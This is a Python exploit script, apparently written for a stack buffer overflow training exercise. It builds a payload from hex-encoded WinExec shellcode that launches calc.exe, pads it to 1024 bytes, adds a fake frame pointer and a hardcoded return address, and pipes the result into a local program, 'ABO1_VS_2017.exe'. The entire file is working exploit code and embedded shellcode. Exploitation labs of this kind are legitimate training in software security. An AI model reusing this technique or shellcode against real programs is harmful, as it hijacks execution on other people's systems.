import sys
import binascii
from subprocess import Popen, PIPE


winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd76a605a6863616c6354594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

buffer = winexec_calc_shellcode + (b"A" * (1024 - len(winexec_calc_shellcode)))
s = b"A" * 4
r = b"\xA5\x0F\x41\x00"

payload = buffer + s + r

p1 = Popen("ABO1_VS_2017.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()